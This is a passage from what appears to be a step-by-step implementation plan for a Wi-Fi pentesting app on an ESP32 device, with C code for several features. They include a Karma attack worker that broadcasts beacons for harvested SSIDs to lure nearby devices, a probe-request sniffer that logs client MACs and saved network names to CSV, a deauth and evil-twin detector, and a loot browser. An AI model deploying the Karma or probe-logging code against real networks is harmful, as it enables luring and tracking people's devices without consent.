            prepare_beacon_packet(packet, mac, ssid, channel);
            if(esp_wifi_80211_tx(WIFI_IF_STA, packet,
                   sizeof(beacon_packet_template), false) == ESP_OK) {
                s_karma_beacons++;
            }
            if((s_karma_beacons % 5) == 0) {
                channel++;
                if(channel > 11) channel = 1;
                esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            }
        }
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    s_karma_task = NULL;
    vTaskDelete(NULL);
}

void wlan_hal_karma_start(void) {
    if(s_karma_active || s_karma_task) return;
    if(!s_started) { if(!wlan_hal_start()) return; }
    if(s_wifi_connected) wlan_hal_disconnect();
    if(!s_karma_lock) s_karma_lock = furi_mutex_alloc(FuriMutexTypeNormal);
    wlan_ssid_set_reset(&s_karma_pnl);
    s_karma_beacons = 0;
    s_karma_active = true;
    if(xTaskCreate(karma_task, "Karma", 4096, NULL, 5, &s_karma_task) != pdPASS) {
        s_karma_active = false;
        s_karma_task = NULL;
        ESP_LOGE(TAG, "karma: xTaskCreate failed");
    }
}

void wlan_hal_karma_stop(void) {
    if(!s_karma_active && !s_karma_task) return;
    s_karma_active = false;
    while(s_karma_task) vTaskDelay(pdMS_TO_TICKS(10));
}

bool wlan_hal_karma_is_running(void) {
    return s_karma_active;
}

void wlan_hal_karma_get_stats(WlanHalKarmaStats* out) {
    out->beacons_sent = s_karma_beacons;
    out->harvested = 0;
    out->top_ssid[0] = '\0';
    if(s_karma_lock && furi_mutex_acquire(s_karma_lock, 0) == FuriStatusOk) {
        out->harvested = s_karma_pnl.count;
        if(s_karma_pnl.count) {
            strncpy(out->top_ssid, s_karma_pnl.ssids[0], sizeof(out->top_ssid) - 1);
            out->top_ssid[sizeof(out->top_ssid) - 1] = '\0';
        }
        furi_mutex_release(s_karma_lock);
    }
}
```
> Verify the exact names of the static WiFi-state flags near the top of `wlan_hal.c` (grep for `s_started` and `s_wifi_connected`). If they differ (e.g. `s_wifi_started`), use the real names. Also confirm `esp_wifi_set_promiscuous_rx_cb` is the API in use for setting the RX callback (grep existing usage in `wlan_hal.c` — the beacon task sets promiscuous without a cb; here we need one).

- [ ] **Step 3: Write the scene** — `applications/main/wlan_app/scenes/scene_karma.c`

Reuses the sniffer view for the readout: title "Karma", `received` = beacons sent, `elapsed` = seconds, target-count = harvested SSIDs. OK toggles run/stop. On stop, record loot.
```c
#include "../wlan_app.h"
#include "../wlan_hal.h"
#include "../wlan_loot.h"
#include <string.h>
#include <stdio.h>

#define KARMA_TICK_MS 250
#define KARMA_TICKS_PER_SEC (1000 / KARMA_TICK_MS)

enum { KarmaEvtToggle = 1 };

static bool s_karma_running;
static uint16_t s_karma_tick;
static uint32_t s_karma_sec;

static void karma_action_cb(WlanSnifferViewAction action, void* ctx) {
    WlanApp* app = ctx;
    if(action == WlanSnifferViewActionToggle) {
        view_dispatcher_send_custom_event(app->view_dispatcher, KarmaEvtToggle);
    }
    // Channel/Targets actions are ignored in Karma.
}

static void karma_record_loot(void) {
    WlanHalKarmaStats st;
    wlan_hal_karma_get_stats(&st);
    if(st.harvested == 0) return;
    char detail[32];
    snprintf(detail, sizeof(detail), "%u harvested", (unsigned)st.harvested);
    wlan_loot_record("karma", st.top_ssid[0] ? st.top_ssid : "(none)", detail);
}

void wlan_app_scene_karma_on_enter(void* context) {
    WlanApp* app = context;
    s_karma_running = false;
    s_karma_tick = 0;
    s_karma_sec = 0;

    wlan_sniffer_view_reset_counters(app->sniffer_view_obj);
    wlan_sniffer_view_set_channel_mode(app->sniffer_view_obj, false);
    wlan_sniffer_view_set_title(app->sniffer_view_obj, "Karma");
    wlan_sniffer_view_set_target_count(app->sniffer_view_obj, 0);
    wlan_sniffer_view_set_running(app->sniffer_view_obj, false);
    wlan_sniffer_view_set_action_callback(app->sniffer_view_obj, karma_action_cb, app);

    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewSniffer);
}

bool wlan_app_scene_karma_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom && event.event == KarmaEvtToggle) {
        if(!s_karma_running) {
            s_karma_tick = 0;
            s_karma_sec = 0;
            wlan_sniffer_view_reset_counters(app->sniffer_view_obj);
            wlan_hal_karma_start();
            s_karma_running = wlan_hal_karma_is_running();
            wlan_sniffer_view_set_running(app->sniffer_view_obj, s_karma_running);
        } else {
            wlan_hal_karma_stop();
            karma_record_loot();
            s_karma_running = false;
            wlan_sniffer_view_set_running(app->sniffer_view_obj, false);
        }
        consumed = true;
    } else if(event.type == SceneManagerEventTypeTick && s_karma_running) {
        s_karma_tick++;
        if(s_karma_tick % KARMA_TICKS_PER_SEC == 0) s_karma_sec++;
        WlanHalKarmaStats st;
        wlan_hal_karma_get_stats(&st);
        wlan_sniffer_view_set_received(app->sniffer_view_obj, st.beacons_sent);
        wlan_sniffer_view_set_elapsed(app->sniffer_view_obj, s_karma_sec);
        wlan_sniffer_view_set_target_count(app->sniffer_view_obj, (uint8_t)st.harvested);
    }
    return consumed;
}

void wlan_app_scene_karma_on_exit(void* context) {
    WlanApp* app = context;
    if(wlan_hal_karma_is_running()) {
        wlan_hal_karma_stop();
        karma_record_loot();
    }
    wlan_sniffer_view_set_action_callback(app->sniffer_view_obj, NULL, NULL);
    wlan_sniffer_view_set_running(app->sniffer_view_obj, false);
    s_karma_running = false;
}
```

- [ ] **Step 4: Register the scene** — append `ADD_SCENE(wlan_app, karma, Karma)` to `scene_config.h`.

- [ ] **Step 5: Build**

Run: `MSYS_NO_PATHCONV=1 cmd.exe /c "...\build_ci.bat" > build_karma.log 2>&1; echo "EXIT=$?"`
Expected: `Project build complete`, `=== BUILD OK ===`, `EXIT=0`.

- [ ] **Step 6: Commit**

```bash
git add applications/main/wlan_app/wlan_hal.h applications/main/wlan_app/wlan_hal.c applications/main/wlan_app/scenes/scene_karma.c applications/main/wlan_app/scenes/scene_config.h
git commit -m "feat(wlan): standalone Karma attack (HAL worker + scene)"
```

---

## Task 9 — Feature: Attack Detector scene + view

Promiscuous + channel-hop (tick-driven, like Spectrum). Per-frame classify via `wlan_attack_classify`; beacons feed the evil-twin tracker via `wlan_evil_twin_observe`. Headline counters + scrolling alert list; alerts appended to loot.

**Files:**
- Create: `applications/main/wlan_app/views/wlan_detector_view.h`
- Create: `applications/main/wlan_app/views/wlan_detector_view.c`
- Create: `applications/main/wlan_app/scenes/scene_attack_detector.c`
- Modify: `wlan_app.h` (view include + enum `WlanAppViewDetector` + `View* view_detector;`), `wlan_app.c` (alloc/register/free), `scene_config.h` (append `ADD_SCENE(wlan_app, attack_detector, AttackDetector)`).

**Interfaces:**
- Consumes: `wlan_attack_detect.h` (Task 3), `wlan_probe_parse.h`.
- Produces:
  ```c
  // wlan_detector_view.h
  #define DET_ALERT_ROWS 6
  typedef struct {
      uint32_t deauth_per_sec;
      uint32_t pwnagotchi;
      uint32_t evil_twin;
      char alerts[DET_ALERT_ROWS][32]; // ring of recent "type detail" lines
      uint8_t alert_head;
      uint8_t alert_count;
  } WlanDetectorViewModel;
  View* wlan_detector_view_alloc(void);
  void wlan_detector_view_free(View* v);
  void wlan_detector_view_push_alert(View* v, const char* line);
  void wlan_detector_view_set_counters(View* v, uint32_t d, uint32_t p, uint32_t e);
  ```

- [ ] **Step 1: View header** — `applications/main/wlan_app/views/wlan_detector_view.h`

```c
#pragma once
#include <gui/view.h>
#include <stdint.h>

#define DET_ALERT_ROWS 6

typedef struct {
    uint32_t deauth_per_sec;
    uint32_t pwnagotchi;
    uint32_t evil_twin;
    char alerts[DET_ALERT_ROWS][32];
    uint8_t alert_head;
    uint8_t alert_count;
} WlanDetectorViewModel;

View* wlan_detector_view_alloc(void);
void wlan_detector_view_free(View* v);
void wlan_detector_view_push_alert(View* v, const char* line);
void wlan_detector_view_set_counters(View* v, uint32_t d, uint32_t p, uint32_t e);
```

- [ ] **Step 2: View impl** — `applications/main/wlan_app/views/wlan_detector_view.c`

```c
#include "wlan_detector_view.h"
#include <gui/elements.h>
#include <furi.h>
#include <stdio.h>
#include <string.h>

static void detector_draw(Canvas* canvas, void* model) {
    WlanDetectorViewModel* m = model;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 2, 10, "Attack Detector");
    canvas_set_font(canvas, FontSecondary);

    char line[40];
    snprintf(line, sizeof(line), "DA/s:%lu Pwn:%lu ET:%lu",
             (unsigned long)m->deauth_per_sec,
             (unsigned long)m->pwnagotchi,
             (unsigned long)m->evil_twin);
    canvas_draw_str(canvas, 2, 22, line);
    canvas_draw_line(canvas, 0, 25, 127, 25);

    // Alert ring, newest at bottom.
    int y = 34;
    uint8_t n = m->alert_count;
    for(uint8_t i = 0; i < n; i++) {
        // oldest-first
        uint8_t idx = (uint8_t)((m->alert_head + DET_ALERT_ROWS - n + i) % DET_ALERT_ROWS);
        canvas_draw_str(canvas, 2, y, m->alerts[idx]);
        y += 9;
        if(y > 63) break;
    }
}

static bool detector_input(InputEvent* event, void* ctx) {
    UNUSED(event); UNUSED(ctx);
    return false; // scene-manager back handler navigates; scene runs on tick
}

View* wlan_detector_view_alloc(void) {
    View* v = view_alloc();
    view_allocate_model(v, ViewModelTypeLocking, sizeof(WlanDetectorViewModel));
    view_set_draw_callback(v, detector_draw);
    view_set_input_callback(v, detector_input);
    return v;
}

void wlan_detector_view_free(View* v) { view_free(v); }

void wlan_detector_view_push_alert(View* v, const char* line) {
    with_view_model(
        v, WlanDetectorViewModel * m,
        {
            strncpy(m->alerts[m->alert_head], line, sizeof(m->alerts[0]) - 1);
            m->alerts[m->alert_head][sizeof(m->alerts[0]) - 1] = '\0';
            m->alert_head = (uint8_t)((m->alert_head + 1) % DET_ALERT_ROWS);
            if(m->alert_count < DET_ALERT_ROWS) m->alert_count++;
        },
        true);
}

void wlan_detector_view_set_counters(View* v, uint32_t d, uint32_t p, uint32_t e) {
    with_view_model(
        v, WlanDetectorViewModel * m,
        { m->deauth_per_sec = d; m->pwnagotchi = p; m->evil_twin = e; }, true);
}
```

- [ ] **Step 3: Register view + enum + field** in `wlan_app.h` / `wlan_app.c` (same pattern as Task 7: include header, add `WlanAppViewDetector`, add `View* view_detector;`, alloc with `view_dispatcher_add_view(..., WlanAppViewDetector, app->view_detector)`, remove + free in `wlan_app_free`). No `view_set_context` needed (input returns false).

- [ ] **Step 4: Scene** — `applications/main/wlan_app/scenes/scene_attack_detector.c`

```c
#include "../wlan_app.h"
#include "../wlan_hal.h"
#include "../wlan_loot.h"
#include "../wlan_attack_detect.h"
#include "../wlan_probe_parse.h"
#include <esp_wifi.h>
#include <string.h>
#include <stdio.h>

#define DET_TICK_MS 250
#define DET_TICKS_PER_SEC (1000 / DET_TICK_MS)
#define DET_MIN_CH 1
#define DET_MAX_CH 13

// Lock-free RX → scene handoff: a small event ring the cb fills, tick drains.
#define DET_RX_RING 32
typedef struct { uint8_t kind; uint8_t src[6]; char ssid[WLAN_PROBE_SSID_MAX]; uint8_t bssid[6]; } DetRxEvt;
static DetRxEvt s_rx[DET_RX_RING];
static volatile uint8_t s_rx_head, s_rx_tail;
static volatile uint32_t s_deauth_window; // deauth frames this second
static uint32_t s_deauth_per_sec, s_pwn_total, s_et_total;
static WlanEvilTwinTracker s_et;
static uint8_t s_cur_ch;
static bool s_running;
static uint16_t s_tick;

static void det_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t* pkt = buf;
    uint16_t len = (uint16_t)pkt->rx_ctrl.sig_len;
    uint8_t src[6];
    WlanAlertType a = wlan_attack_classify(pkt->payload, len, src);
    if(a == WlanAlertDeauth) s_deauth_window++;
    // For evil-twin we need SSID+BSSID from beacons — push to ring for tick parse.
    uint8_t nh = (uint8_t)((s_rx_head + 1) % DET_RX_RING);
    if(nh == s_rx_tail) return; // ring full, drop
    DetRxEvt* e = &s_rx[s_rx_head];
    e->kind = (uint8_t)a;
    memcpy(e->src, src, 6);
    e->ssid[0] = '\0';
    if((pkt->payload[0] & 0xF0) == 0x80 && len >= 36) { // beacon
        memcpy(e->bssid, &pkt->payload[16], 6); // addr3 = BSSID
        wlan_probe_ssid_ie(pkt->payload, len, 36, e->ssid);
    }
    s_rx_head = nh;
}

static const char* det_type_name(uint8_t k) {
    if(k == WlanAlertDeauth) return "DEAUTH";
    if(k == WlanAlertPwnagotchi) return "PWNGCH";
    return "ALERT";
}

void wlan_app_scene_attack_detector_on_enter(void* context) {
    WlanApp* app = context;
    s_rx_head = s_rx_tail = 0;
    s_deauth_window = 0;
    s_deauth_per_sec = s_pwn_total = s_et_total = 0;
    wlan_evil_twin_reset(&s_et);
    s_cur_ch = DET_MIN_CH;
    s_tick = 0;
    s_running = true;

    wlan_detector_view_set_counters(app->view_detector, 0, 0, 0);
    with_view_model(app->view_detector, WlanDetectorViewModel * m,
                    { m->alert_head = 0; m->alert_count = 0; }, true);

    if(!wlan_hal_is_started()) wlan_hal_start();
    if(wlan_hal_is_connected()) wlan_hal_disconnect();
    wlan_hal_set_channel(s_cur_ch);
    wlan_hal_set_promiscuous(true, det_cb);

    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewDetector);
}

bool wlan_app_scene_attack_detector_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    if(event.type != SceneManagerEventTypeTick || !s_running) return false;

    // Drain RX ring: evil-twin detection + pwnagotchi count + alert list.
    while(s_rx_tail != s_rx_head) {
        DetRxEvt* e = &s_rx[s_rx_tail];
        s_rx_tail = (uint8_t)((s_rx_tail + 1) % DET_RX_RING);
        char line[32];
        if(e->kind == WlanAlertPwnagotchi) {
            s_pwn_total++;
            snprintf(line, sizeof(line), "PWNGCH %02X%02X", e->src[4], e->src[5]);
            wlan_detector_view_push_alert(app->view_detector, line);
            wlan_loot_record("alert", "pwnagotchi", line);
        }
        if(e->ssid[0] && wlan_evil_twin_observe(&s_et, e->ssid, e->bssid)) {
            s_et_total++;
            snprintf(line, sizeof(line), "TWIN %.12s", e->ssid);
            wlan_detector_view_push_alert(app->view_detector, line);
            wlan_loot_record("alert", "evil_twin", e->ssid);
        }
    }

    // Deauth rate: fold the per-second window each full second.
    s_tick++;
    if(s_tick % DET_TICKS_PER_SEC == 0) {
        s_deauth_per_sec = s_deauth_window;
        s_deauth_window = 0;
        if(s_deauth_per_sec >= 10) { // flood threshold
            char line[32];
            snprintf(line, sizeof(line), "DEAUTH %lu/s", (unsigned long)s_deauth_per_sec);
            wlan_detector_view_push_alert(app->view_detector, line);
            wlan_loot_record("alert", "deauth_flood", line);
        }
    }
    wlan_detector_view_set_counters(app->view_detector, s_deauth_per_sec, s_pwn_total, s_et_total);

    // Channel hop each tick.
    s_cur_ch = (s_cur_ch >= DET_MAX_CH) ? DET_MIN_CH : (uint8_t)(s_cur_ch + 1);
    wlan_hal_set_channel(s_cur_ch);
    return false; // ticks are not "consumed"
}

void wlan_app_scene_attack_detector_on_exit(void* context) {
    UNUSED(context);
    wlan_hal_set_promiscuous(false, NULL);
    s_running = false;
}
```

- [ ] **Step 5: Register scene** — append `ADD_SCENE(wlan_app, attack_detector, AttackDetector)` to `scene_config.h`.

- [ ] **Step 6: Build** → `build_detector.log`; expect `Project build complete` + `=== BUILD OK ===` + `EXIT=0`.

- [ ] **Step 7: Commit**
```bash
git add applications/main/wlan_app/views/wlan_detector_view.h applications/main/wlan_app/views/wlan_detector_view.c applications/main/wlan_app/scenes/scene_attack_detector.c applications/main/wlan_app/scenes/scene_config.h applications/main/wlan_app/wlan_app.h applications/main/wlan_app/wlan_app.c
git commit -m "feat(wlan): Attack Detector scene + view"
```

---

## Task 10 — Feature: Probe / PNL Sniffer scene + view

Promiscuous filter to probe-requests; build the `WlanProbeTable` (Task 2). Scrolling `MAC → SSID` lines + unique-client / unique-SSID counts. On exit, write `probes.csv` into the loot session + a manifest row.

**Files:**
- Create: `applications/main/wlan_app/views/wlan_probe_view.h`
- Create: `applications/main/wlan_app/views/wlan_probe_view.c`
- Create: `applications/main/wlan_app/scenes/scene_probe_sniffer.c`
- Modify: `wlan_app.h` (include + enum `WlanAppViewProbe` + `View* view_probe;`), `wlan_app.c` (alloc/register/free), `scene_config.h` (append `ADD_SCENE(wlan_app, probe_sniffer, ProbeSniffer)`).

**Interfaces:**
- Consumes: `wlan_probe_parse.h`, `wlan_probe_table.h`, `wlan_loot.h`, `Storage`.
- Produces:
  ```c
  // wlan_probe_view.h
  #define PROBE_VIEW_ROWS 5
  typedef struct {
      char lines[PROBE_VIEW_ROWS][32]; // "AABBCC → SSID"
      uint8_t line_count;
      uint16_t unique_clients;
      uint16_t unique_ssids;
  } WlanProbeViewModel;
  View* wlan_probe_view_alloc(void);
  void wlan_probe_view_free(View* v);
  void wlan_probe_view_update(View* v, const char lines[][32], uint8_t n,
                              uint16_t clients, uint16_t ssids);
  ```

- [ ] **Step 1: View header** — `applications/main/wlan_app/views/wlan_probe_view.h`

```c
#pragma once
#include <gui/view.h>
#include <stdint.h>

#define PROBE_VIEW_ROWS 5

typedef struct {
    char lines[PROBE_VIEW_ROWS][32];
    uint8_t line_count;
    uint16_t unique_clients;
    uint16_t unique_ssids;
} WlanProbeViewModel;

View* wlan_probe_view_alloc(void);
void wlan_probe_view_free(View* v);
void wlan_probe_view_update(View* v, const char lines[][32], uint8_t n,
                            uint16_t clients, uint16_t ssids);
```

- [ ] **Step 2: View impl** — `applications/main/wlan_app/views/wlan_probe_view.c`

```c
#include "wlan_probe_view.h"
#include <gui/elements.h>
#include <furi.h>
#include <stdio.h>
#include <string.h>

static void probe_draw(Canvas* canvas, void* model) {
    WlanProbeViewModel* m = model;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 2, 10, "Probe Sniffer");
    canvas_set_font(canvas, FontSecondary);
    char hdr[32];
    snprintf(hdr, sizeof(hdr), "clients:%u ssids:%u",
             (unsigned)m->unique_clients, (unsigned)m->unique_ssids);
    canvas_draw_str(canvas, 2, 21, hdr);
    canvas_draw_line(canvas, 0, 24, 127, 24);
    int y = 33;
    for(uint8_t i = 0; i < m->line_count && i < PROBE_VIEW_ROWS; i++) {
        canvas_draw_str(canvas, 2, y, m->lines[i]);
        y += 9;
    }
}

static bool probe_input(InputEvent* event, void* ctx) {
    UNUSED(event); UNUSED(ctx);
    return false;
}

View* wlan_probe_view_alloc(void) {
    View* v = view_alloc();
    view_allocate_model(v, ViewModelTypeLocking, sizeof(WlanProbeViewModel));
    view_set_draw_callback(v, probe_draw);
    view_set_input_callback(v, probe_input);
    return v;
}

void wlan_probe_view_free(View* v) { view_free(v); }

void wlan_probe_view_update(View* v, const char lines[][32], uint8_t n,
                            uint16_t clients, uint16_t ssids) {
    with_view_model(
        v, WlanProbeViewModel * m,
        {
            m->line_count = n > PROBE_VIEW_ROWS ? PROBE_VIEW_ROWS : n;
            for(uint8_t i = 0; i < m->line_count; i++) {
                strncpy(m->lines[i], lines[i], 31);
                m->lines[i][31] = '\0';
            }
            m->unique_clients = clients;
            m->unique_ssids = ssids;
        },
        true);
}
```

- [ ] **Step 3: Register view + enum + field** (same pattern as Task 9).

- [ ] **Step 4: Scene** — `applications/main/wlan_app/scenes/scene_probe_sniffer.c`

```c
#include "../wlan_app.h"
#include "../wlan_hal.h"
#include "../wlan_loot.h"
#include "../wlan_probe_parse.h"
#include "../wlan_probe_table.h"
#include <storage/storage.h>
#include <esp_wifi.h>
#include <string.h>
#include <stdio.h>

#define PROBE_MIN_CH 1
#define PROBE_MAX_CH 13

// RX → tick ring of (mac, ssid).
#define PROBE_RX_RING 32
typedef struct { uint8_t mac[6]; char ssid[WLAN_PROBE_SSID_MAX]; } ProbeRxEvt;
static ProbeRxEvt s_ring[PROBE_RX_RING];
static volatile uint8_t s_head, s_tail;
static WlanProbeTable s_table;
static uint8_t s_cur_ch;
static bool s_running;

static void probe_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t* pkt = buf;
    uint16_t len = (uint16_t)pkt->rx_ctrl.sig_len;
    char ssid[WLAN_PROBE_SSID_MAX];
    uint8_t mac[6];
    if(!wlan_probe_extract(pkt->payload, len, ssid, mac)) return;
    uint8_t nh = (uint8_t)((s_head + 1) % PROBE_RX_RING);
    if(nh == s_tail) return;
    memcpy(s_ring[s_head].mac, mac, 6);
    strncpy(s_ring[s_head].ssid, ssid, WLAN_PROBE_SSID_MAX - 1);
    s_ring[s_head].ssid[WLAN_PROBE_SSID_MAX - 1] = '\0';
    s_head = nh;
}

// Build the display lines from the most-recently-touched table entries.
static void probe_refresh_view(WlanApp* app) {
    char lines[PROBE_VIEW_ROWS][32];
    uint8_t n = 0;
    // pick up to PROBE_VIEW_ROWS entries with the highest seq
    uint32_t used_seq[PROBE_VIEW_ROWS] = {0};
    int used_idx[PROBE_VIEW_ROWS];
    for(int i = 0; i < PROBE_VIEW_ROWS; i++) used_idx[i] = -1;
    for(uint8_t i = 0; i < WLAN_PT_CAP; i++) {
        if(!s_table.entries[i].used) continue;
        uint32_t seq = s_table.entries[i].seq;
        for(int r = 0; r < PROBE_VIEW_ROWS; r++) {
            if(used_idx[r] < 0 || seq > used_seq[r]) {
                for(int s = PROBE_VIEW_ROWS - 1; s > r; s--) {
                    used_seq[s] = used_seq[s - 1]; used_idx[s] = used_idx[s - 1];
                }
                used_seq[r] = seq; used_idx[r] = i;
                break;
            }
        }
    }
    for(int r = 0; r < PROBE_VIEW_ROWS; r++) {
        if(used_idx[r] < 0) break;
        WlanPtEntry* e = &s_table.entries[used_idx[r]];
        const char* ss = e->ssid_count ? e->ssids[e->ssid_count - 1] : "*";
        snprintf(lines[n], sizeof(lines[0]), "%02X%02X%02X %.16s",
                 e->mac[3], e->mac[4], e->mac[5], ss);
        n++;
    }
    wlan_probe_view_update(app->view_probe, lines, n,
                           wlan_probe_table_client_count(&s_table),
                           wlan_probe_table_ssid_count(&s_table));
}

static void probe_write_csv(void) {
    if(wlan_probe_table_client_count(&s_table) == 0) return;
    const char* dir = wlan_loot_session_dir();
    char path[96];
    snprintf(path, sizeof(path), "%s/probes.csv", dir);
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(storage);
    if(storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        const char* hdr = "mac,ssid\n";
        storage_file_write(f, hdr, strlen(hdr));
        for(uint8_t i = 0; i < WLAN_PT_CAP; i++) {
            WlanPtEntry* e = &s_table.entries[i];
            if(!e->used) continue;
            for(uint8_t j = 0; j < e->ssid_count; j++) {
                char row[64];
                int rn = snprintf(row, sizeof(row), "%02X:%02X:%02X:%02X:%02X:%02X,%.32s\n",
                                  e->mac[0], e->mac[1], e->mac[2],
                                  e->mac[3], e->mac[4], e->mac[5], e->ssids[j]);
                if(rn > 0) storage_file_write(f, row, (size_t)rn);
            }
        }
        storage_file_close(f);
    }
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
    char detail[32];
    snprintf(detail, sizeof(detail), "%u clients", wlan_probe_table_client_count(&s_table));
    wlan_loot_record("probes", "probe_sniffer", detail);
}

void wlan_app_scene_probe_sniffer_on_enter(void* context) {
    WlanApp* app = context;
    s_head = s_tail = 0;
    wlan_probe_table_reset(&s_table);
    s_cur_ch = PROBE_MIN_CH;
    s_running = true;
    probe_refresh_view(app);

    if(!wlan_hal_is_started()) wlan_hal_start();
    if(wlan_hal_is_connected()) wlan_hal_disconnect();
    wlan_hal_set_channel(s_cur_ch);
    wlan_hal_set_promiscuous(true, probe_cb);
    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewProbe);
}

bool wlan_app_scene_probe_sniffer_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    if(event.type != SceneManagerEventTypeTick || !s_running) return false;
    while(s_tail != s_head) {
        ProbeRxEvt* e = &s_ring[s_tail];
        s_tail = (uint8_t)((s_tail + 1) % PROBE_RX_RING);
        wlan_probe_table_add(&s_table, e->mac, e->ssid);
    }
    probe_refresh_view(app);
    s_cur_ch = (s_cur_ch >= PROBE_MAX_CH) ? PROBE_MIN_CH : (uint8_t)(s_cur_ch + 1);
    wlan_hal_set_channel(s_cur_ch);
    return false;
}

void wlan_app_scene_probe_sniffer_on_exit(void* context) {
    UNUSED(context);
    wlan_hal_set_promiscuous(false, NULL);
    s_running = false;
    probe_write_csv();
}
```

- [ ] **Step 5: Register scene** — append `ADD_SCENE(wlan_app, probe_sniffer, ProbeSniffer)`.

- [ ] **Step 6: Build** → `build_probe.log`; expect success markers.

- [ ] **Step 7: Commit**
```bash
git add applications/main/wlan_app/views/wlan_probe_view.h applications/main/wlan_app/views/wlan_probe_view.c applications/main/wlan_app/scenes/scene_probe_sniffer.c applications/main/wlan_app/scenes/scene_config.h applications/main/wlan_app/wlan_app.h applications/main/wlan_app/wlan_app.c
git commit -m "feat(wlan): Probe/PNL Sniffer scene + view + probes.csv export"
```

---

## Task 11 — Feature: Unified Loot Browser scenes

Three levels via the `Storage` API, reusing the submenu + widget views: (1) session list `/ext/loot/*` newest-first; (2) manifest.csv entries + raw files; (3) text-box preview (size-capped). Actions: Delete session, Wipe all loot (each behind a confirm).

**Files:**
- Create: `applications/main/wlan_app/scenes/scene_loot_browser.c` (session list + actions)
- Create: `applications/main/wlan_app/scenes/scene_loot_entries.c` (entries within a session)
- Create: `applications/main/wlan_app/scenes/scene_loot_preview.c` (file preview)
- Modify: `wlan_app.h` — add `char loot_session[64];` and `char loot_file[96];` fields to `struct WlanApp` (selected paths passed between scenes).
- Modify: `scene_config.h` — append the three `ADD_SCENE` lines.

**Interfaces:**
- Consumes: `wlan_loot_manifest.h` (Task 5), `Storage`, existing `app->submenu` + `app->widget` + `app->text_buf`.
- Produces: three scene handler triples (auto-declared).

**Implementation notes (patterns to follow):**
- Session list uses `storage_dir_open` / `storage_dir_read` over `/ext/loot`, collecting directory names, then `submenu_add_item` for each (store index→name in a static bounded array `char sessions[N][32]`). Newest-first: names are `YYYYMMDD_HHMMSS`, so reverse-sort lexicographically. Add two trailing items "Wipe all loot" + (per session) route to entries.
- Confirm dialogs reuse `app->widget` with `widget_add_button_element` OR the simpler pattern already in the app: check `scene_evil_portal_captured.c` for a confirm/popup example and mirror it. (Read it before writing.)
- Deleting: recursive remove via `storage_simply_remove_recursive(storage, path)` if available in this port — grep `storage_simply_remove_recursive` / `storage_common_remove` in the tree and use whichever exists.
- Preview: `storage_file_read` up to a cap (e.g. 2048 bytes) into `app->text_buf`, show with `widget_add_text_scroll_element`.
- Entries scene parses each manifest line with `wlan_manifest_parse_line` (Task 5) and renders `time · type · target` via `submenu_add_item`; selecting a row that maps to a raw file (e.g. `probes.csv`, `*.pcap`) routes to preview with `app->loot_file` set.

- [ ] **Step 1: Read the confirm/widget + storage-remove patterns**

Run (Grep/Read): inspect `applications/main/wlan_app/scenes/scene_evil_portal_captured.c` for the widget/confirm pattern, and `grep -rn "storage_simply_remove_recursive\|storage_common_remove\|dir_read" applications/` to confirm the exact recursive-remove + dir-iteration APIs available. Use the ones that exist.

- [ ] **Step 2: Write `scene_loot_browser.c`** — session list + "Wipe all loot" confirm.

Skeleton (fill the storage iteration using the APIs confirmed in Step 1):
```c
#include "../wlan_app.h"
#include "../wlan_loot.h"
#include <storage/storage.h>
#include <string.h>
#include <stdio.h>

#define LOOT_ROOT "/ext/loot"
#define LOOT_MAX_SESSIONS 32

static char s_sessions[LOOT_MAX_SESSIONS][32];
static uint8_t s_session_count;

enum { LootIdxWipeAll = 1000 };

static void loot_menu_cb(void* context, uint32_t index) {
    WlanApp* app = context;
    view_dispatcher_send_custom_event(app->view_dispatcher, index);
}

static int loot_cmp_desc(const void* a, const void* b) {
    return strncmp((const char*)b, (const char*)a, 32); // reverse = newest first
}

static void loot_scan_sessions(void) {
    s_session_count = 0;
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* dir = storage_file_alloc(storage);
    if(storage_dir_open(dir, LOOT_ROOT)) {
        FileInfo info;
        char name[64];
        while(storage_dir_read(dir, &info, name, sizeof(name)) &&
              s_session_count < LOOT_MAX_SESSIONS) {
            if(info.flags & FSF_DIRECTORY) {
                strncpy(s_sessions[s_session_count], name, 31);
                s_sessions[s_session_count][31] = '\0';
                s_session_count++;
            }
        }
        storage_dir_close(dir);
    }
    storage_file_free(dir);
    furi_record_close(RECORD_STORAGE);
    qsort(s_sessions, s_session_count, 32, loot_cmp_desc);
}

void wlan_app_scene_loot_browser_on_enter(void* context) {
    WlanApp* app = context;
    submenu_reset(app->submenu);
    submenu_set_header_centered(app->submenu, "Loot");
    loot_scan_sessions();
    for(uint8_t i = 0; i < s_session_count; i++) {
        submenu_add_item(app->submenu, s_sessions[i], i, loot_menu_cb, app);
    }
    if(s_session_count) {
        submenu_add_separator(app->submenu);
        submenu_add_item(app->submenu, "Wipe all loot", LootIdxWipeAll, loot_menu_cb, app);
    } else {
        submenu_add_item(app->submenu, "(no loot yet)", 9999, loot_menu_cb, app);
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewSubmenu);
}

bool wlan_app_scene_loot_browser_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    if(event.type != SceneManagerEventTypeCustom) return false;
    if(event.event == LootIdxWipeAll) {
        // Confirm + recursive-remove LOOT_ROOT using the API confirmed in Step 1,
        // then re-enter this scene. (Mirror the confirm pattern from Step 1.)
        // ... implement ...
        return true;
    }
    if(event.event < s_session_count) {
